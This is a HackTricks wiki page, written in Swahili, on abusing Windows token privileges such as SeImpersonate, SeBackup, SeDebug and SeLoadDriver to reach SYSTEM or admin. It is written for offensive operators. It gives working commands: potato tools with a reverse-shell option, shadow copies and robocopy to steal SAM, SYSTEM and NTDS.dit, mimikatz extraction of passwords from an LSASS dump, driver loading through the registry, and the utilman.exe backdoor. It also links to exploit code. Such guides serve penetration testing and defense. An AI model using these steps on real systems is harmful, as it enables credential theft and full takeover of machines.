# Kutumia Vibaya Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Ikiwa **huijui Windows Access Tokens ni nini**, soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Huenda ukaweza kuongeza privileges kwa kutumia vibaya tokens ambazo tayari unazo.**

### SeImpersonatePrivilege

Privilege hii huruhusu process kuiga utambulisho wa token (lakini si kuunda token) inapoweza kupata handle ya token hiyo. Token yenye privileges za juu inaweza kupatikana kutoka kwa Windows service (DCOM) kwa kuishawishi ifanye authentication ya NTLM dhidi ya exploit, na hivyo kuwezesha kuendesha process yenye privileges za SYSTEM.<sup>[[2]](#references)</sup> Primitive hii inaweza kutumiwa kwa tools kama vile [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (ambayo inahitaji WinRM iwe imezimwa), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Maelezo ya kisasa kwa operators:

- **JuicyPotato ni legacy**: kwenye Windows 10 1809+/Server 2019+, pendelea **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer**, kulingana na surface ya RPC/COM ambayo bado inaweza kufikiwa.
- Ikiwa uli-compromise service inayoendesha kama **`LOCAL SERVICE`** au **`NETWORK SERVICE`** na `whoami /priv` inaonyesha **filtered token** bila `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, kwanza rejesha **default privilege set** ya account hiyo (kwa mfano kwa kutumia **FullPowers**) kisha ujaribu tena potato family.<sup>[[3]](#references)</sup>
- Baadhi ya forks mpya ni rahisi zaidi kutumiwa na operators kuliko tools za awali. Kwa mfano, **SigmaPotato** inaongeza reflection/in-memory execution na compatibility ya kisasa ya Windows, huku **PrintNotifyPotato** ikitumia vibaya PrintNotify COM service na mara nyingi ikiwa muhimu wakati classic Spooler path imezimwa.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Inafanana sana na **SeImpersonatePrivilege**, itatumia **njia ileile** kupata token yenye privileges za juu.\
Kisha, privilege hii inaruhusu **kukabidhi token ya msingi** kwa process mpya/iliyosimamishwa. Ukiwa na token ya impersonation yenye privileges, unaweza kuunda token ya msingi (DuplicateTokenEx).\
Ukitumia token hiyo, unaweza kuunda **process mpya** kwa kutumia 'CreateProcessAsUser' au kuunda process ikiwa suspended na **kuweka token** (kwa ujumla, huwezi kurekebisha token ya msingi ya process inayoendelea).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ikiwa token hii imewezeshwa, unaweza kutumia **KERB_S4U_LOGON** kupata **token ya impersonation** ya mtumiaji mwingine yeyote bila kujua credentials, **kuongeza group yoyote** (admins) kwenye token, kuweka **integrity level** ya token kuwa "**medium**", na kukabidhi token hii kwa **thread ya sasa** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Kwa privilege hii, mfumo huwezesha **ruhusa zote za kusoma** kwa faili yoyote (ikiwa imewekewa kikomo kwa operesheni za kusoma). Inatumika **kusoma password hashes za akaunti za local Administrator** kutoka kwenye registry, kisha tools kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa pamoja na hash hiyo (mbinu ya Pass-the-Hash). Hata hivyo, mbinu hii hushindwa katika hali mbili: akaunti ya Local Administrator ikiwa imezimwa, au ikiwa kuna policy inayoondoa administrative rights kwa Local Administrators wanaounganisha remotely.<sup>[[2]](#references)</sup>\
Kwa matumizi ya vitendo, workflow ya built-in iliyoaminika zaidi kwa kawaida ni **VSS + `robocopy /b`**: tengeneza/expose shadow copy, kisha nakili `SAM`/`SYSTEM` au `NTDS.dit` katika **backup mode**, jambo linalozipita file ACLs.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Unaweza **kutumia vibaya privilege hii** kwa:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kumfuata **IppSec** katika [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **escalating privileges with Backup Operators** ya:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ruhusa ya **write access** kwa faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili, hutolewa na privilege hii. Hii hufungua uwezekano mwingi wa escalation, ikiwa ni pamoja na uwezo wa **modify services**, kufanya DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options, miongoni mwa techniques nyingine mbalimbali.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni permission yenye nguvu, hasa inapokuwa user ana uwezo wa ku-impersonate tokens, lakini pia wakati SeImpersonatePrivilege haipo. Uwezo huu unategemea uwezo wa ku-impersonate token inayomwakilisha user yuleyule na ambayo integrity level yake haizidi ya process ya sasa.<sup>[[2]](#references)</sup>

**Mambo Muhimu:**

- **Impersonation bila SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kwa EoP kwa ku-impersonate tokens chini ya masharti maalum.
- **Masharti ya Token Impersonation:** Impersonation iliyofanikiwa inahitaji target token iwe ya user yuleyule na iwe na integrity level iliyo chini au sawa na integrity level ya process inayojaribu kufanya impersonation.
- **Uundaji na Marekebisho ya Impersonation Tokens:** Users wanaweza kuunda impersonation token na kuiboresha kwa kuongeza SID ya privileged group (Security Identifier).

### SeLoadDriverPrivilege

Privilege hii huruhusu process **load and unload device drivers** kwa kuunda registry entry yenye thamani maalum za `ImagePath` na `Type`. Kwa kuwa write access ya moja kwa moja kwa `HKLM` (HKEY_LOCAL_MACHINE) imezuiwa, `HKCU` (HKEY_CURRENT_USER) inaweza kutumika badala yake. Hata hivyo, path maalum inahitajika ili kufanya `HKCU` entry itambulike na kernel kama driver configuration.<sup>[[2]](#references)</sup>

Matumizi ya kisasa ya offensive kwa kawaida huwa **BYOVD** (bring your own vulnerable driver): load **signed but vulnerable** kernel driver kisha utumie IOCTLs zake kuzima protections au kufikia kernel code execution. Kumbuka kwamba kwenye Windows 11/Server builds za hivi karibuni, **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huvuruga chains za zamani za public; kwa hiyo mifano ya mtindo wa `szkg64.sys` si ya kuaminika kila mahali tena.

Path hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya user wa sasa. Ndani ya `HKCU`, path hii yote lazima iundwe, na values mbili zinahitaji kuwekwa:<sup>[[2]](#references)</sup>

- `ImagePath`, ambayo ni path ya binary itakayotekelezwa
- `Type`, yenye thamani ya `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Hatua za Kufuatwa:**

1. Fikia `HKCU` badala ya `HKLM` kwa sababu ya restricted write access.
2. Unda path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya user wa sasa.
3. Weka `ImagePath` kwenye path ya execution ya binary.
4. Weka `Type` kuwa `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Njia zaidi za kutumia vibaya privilege hii zinapatikana kwenye [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii inafanana na **SeRestorePrivilege**. Kazi yake kuu inaruhusu process **kuchukua umiliki wa object**, na hivyo kukwepa hitaji la ruhusa ya wazi ya discretionary access kupitia utoaji wa access rights za WRITE_OWNER. Mchakato huu unahusisha kwanza kupata umiliki wa registry key inayolengwa kwa madhumuni ya kuandika, kisha kubadilisha DACL ili kuwezesha shughuli za uandishi.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Privilege hii inaruhusu **debug other processes**, ikiwemo kusoma na kuandika kwenye memory. Mbinu mbalimbali za memory injection, zenye uwezo wa kukwepa antivirus nyingi na suluhisho za host intrusion prevention, zinaweza kutumiwa kwa privilege hii.<sup>[[2]](#references)</sup>

Kwenye Windows za kisasa, kumbuka kwamba `SeDebugPrivilege` kwa kawaida inatosha kufungua **non-protected SYSTEM processes** na kunakili tokens zao, lakini **si dhamana kwamba unaweza kugusa** **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewezeshwa, non-protected processes haziwezi kusoma au kuingiza code kwenye LSASS hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, steal token kutoka kwa non-PPL SYSTEM process nyingine, au chain na PPL bypass/BYOVD badala ya kudhani kwamba `procdump` itafanya kazi. Kwa mfano kamili wa kunakili token kwa kutumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [ukurasa huu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka kwenye [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) ili **kunasa memory ya process**. Hasa, hii inaweza kutumika kwa process ya **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambayo inawajibika kuhifadhi credentials za mtumiaji baada ya mtumiaji kuingia kwenye mfumo kwa mafanikio.

Kisha unaweza ku-load dump hii kwenye mimikatz ili kupata passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ikiwa unataka kupata shell ya `NT SYSTEM`, unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Haki hii (Perform volume maintenance tasks) inaruhusu kufungua raw volume device handles (kwa mfano, \\.\C:) kwa direct disk I/O inayopita NTFS ACLs. Ukiwa nayo, unaweza kunakili bytes za file lolote kwenye volume kwa kusoma blocks za msingi, hivyo kuwezesha arbitrary file read ya taarifa nyeti (kwa mfano, machine private keys katika %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS kupitia VSS).<sup>[[5]](#references)</sup> Ina athari kubwa hasa kwenye CA servers, ambapo exfiltrating CA private key huwezesha forging a Golden Certificate ili impersonate principal yoyote.<sup>[[6]](#references)</sup>

Tazama mbinu na mitigations za kina:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Kagua privileges
```
whoami /priv
```
The **tokens zinazoonekana kama Disabled** kwa kawaida zinaweza kuwezeshwa, hivyo mara nyingi unaweza kutumia vibaya privileges za _Enabled_ na _Disabled_ zote.

### Wezesha tokens Zote

Ikiwa una privileges zilizozimwa, unaweza kutumia script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) kuwezesha tokens zote:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Au **script** uliyo-embed kwenye [**chapisho**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Jedwali

Cheatsheet kamili ya token privileges inapatikana kwenye [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), muhtasari ulio hapa chini utaorodhesha tu njia za moja kwa moja za kutumia privilege kupata admin session au kusoma faili nyeti.<sup>[[1]](#references)</sup>

| Privilege                  | Athari      | Tool                    | Njia ya utekelezaji                                                                                                                                                                                                                                                                                                                                     | Maelezo                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Ingemruhusu mtumiaji ku-impersonate tokens na kufanya privesc hadi nt system kwa kutumia tools kama potato.exe, rottenpotato.exe na juicypotato.exe"_                                                                                                                                                                                                      | Shukrani kwa [Aurélien Chalot](https://twitter.com/Defte_) kwa update. Nitajaribu kuiandika upya kwa mtindo wa recipe hivi karibuni.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tishio**  | _**Built-in commands**_ | Soma faili nyeti kwa `robocopy /b` au copy helpers maalum zinazotambua SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ni nzuri kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi kutumia, lakini SeBackup cmdlets/APIs maalum mara nyingi huwa na flexibility zaidi kwa faili zilizofungwa/zilizo wazi.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Unda token yoyote ikijumuisha local admin rights kwa kutumia `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate **non-PPL** SYSTEM token au dump memory kutoka kwenye process isiyolindwa.                                                                                                                                                                                                                                                                 | <p>LSASS dumping mara nyingi huzuiwa ikiwa RunAsPPL/LSA Protection imewezeshwa.</p><p>Script inapatikana kwenye [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Tumia **Potato family** / named-pipe impersonation ku-spawn SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, n.k.).                                                                                                                                                                                    | <p>Ni ya vitendo zaidi kutoka kwenye service accounts kama IIS APPPOOL, MSSQL, scheduled tasks, au context yoyote ambayo tayari inamiliki `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load signed-but-vulnerable kernel driver (BYOVD)<br>2. Tumia IOCTLs za driver kupata kernel R/W, kuzima security tooling, au ku-elevate hadi SYSTEM<br><br>Vinginevyo, privilege hii inaweza kutumika ku-unload security-related drivers kwa `fltMC` builtin command, yaani `fltMC sysmondrv`</p>                     | <p>Public drivers za zamani kama <code>szkg64.sys</code> zinazuiwa zaidi kwenye Windows za kisasa na vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE ikiwa SeRestore privilege ipo.<br>2. Enable privilege kwa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe kuwa utilman.old<br>4. Rename cmd.exe kuwa utilman.exe<br>5. Lock console na ubonyeze Win+U</p> | <p>Attack inaweza kugunduliwa na baadhi ya AV software.</p><p>Alternative method inategemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe kuwa utilman.exe<br>4. Lock console na ubonyeze Win+U</p>                                                                                                                                       | <p>Attack inaweza kugunduliwa na baadhi ya AV software.</p><p>Alternative method inategemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens ili zijumuishe local admin rights. Huenda ikahitaji SeImpersonate.</p><p>Bado haijathibitishwa.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - njia za exploitation kutoka Windows privileges hadi admin](https://github.com/gtworek/Priv2Admin)
- [2] [Kutumia Token Privileges kwa LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Nirudishie Privileges Zangu! Tafadhali?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode hupita ukaguzi wa file/folder ACL)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Tekeleza kazi za volume maintenance (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
